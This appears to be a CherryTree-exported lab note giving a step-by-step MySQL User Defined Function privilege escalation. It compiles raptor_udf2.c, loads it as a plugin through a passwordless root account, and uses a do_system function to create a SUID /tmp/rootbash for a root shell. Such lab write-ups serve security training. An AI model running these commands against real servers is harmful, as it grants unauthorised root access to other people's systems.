<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Service Exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Service Exploits</h1><br/><p><strong><h1>Service Exploits</h1></strong></p><p></p><p><strong><h2>A) MySQL</h2></strong></p><p></p><p>The MySQL service is running as root and the &quot;root&quot; user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.</p><p></p><p>Change into the /home/user/tools/mysql-udf directory:</p><p></p><p>cd /home/user/tools/mysql-udf</p><p></p><p>Compile the <strong>raptor_udf2.c</strong> exploit code using the following commands:</p><p></p><p><strong>gcc -g -c raptor_udf2.c -fPIC</strong></p><p><strong>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</strong></p><p></p><p>Connect to the MySQL service as the root user with a blank password:</p><p></p><p><strong>mysql -u root</strong></p><p></p><p>Execute the following commands on the MySQL shell to create a User Defined Function (UDF) &quot;do_system&quot; using our compiled exploit:</p><p></p><p><strong>use mysql;</strong></p><p><strong>create table foo(line blob);</strong></p><p><strong>insert into foo values(load_file(&#39;/home/user/tools/mysql-udf/raptor_udf2.so&#39;));</strong></p><p><strong>select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;;</strong></p><p><strong>create function do_system returns integer soname &#39;raptor_udf2.so&#39;;</strong></p><p></p><p>Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:</p><p></p><p><strong>select do_system(&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;);</strong></p><p></p><p>Exit out of the MySQL shell (type <strong>exit</strong> or <strong>\q</strong> and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p><p></p><p><strong>/tmp/rootbash -p</strong></p><p></p><p>We should have root access.</p><p></p><p><strong><h3>END</h3></strong></p><p></p></div>
</body>
</html>
